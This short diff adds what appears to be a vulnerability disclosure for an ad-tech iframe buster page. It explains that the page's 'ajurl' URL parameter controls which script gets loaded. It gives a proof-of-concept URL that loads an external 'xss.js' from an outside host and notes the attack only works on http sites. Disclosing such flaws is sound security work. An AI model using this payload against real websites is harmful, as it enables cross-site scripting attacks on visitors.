@@ -1,0 +1,6 @@
+The script parse param in URL and fill an object "ut".
+One of them is special, ajurl as it contains the url of script to be loaded.
+
+Simple PoC /undertone/UT_IFRAME_buster.html?ajurl=https://bgtian.life/xss.js
+
+PS: as the script ajs.js is load with http this will only work in http website
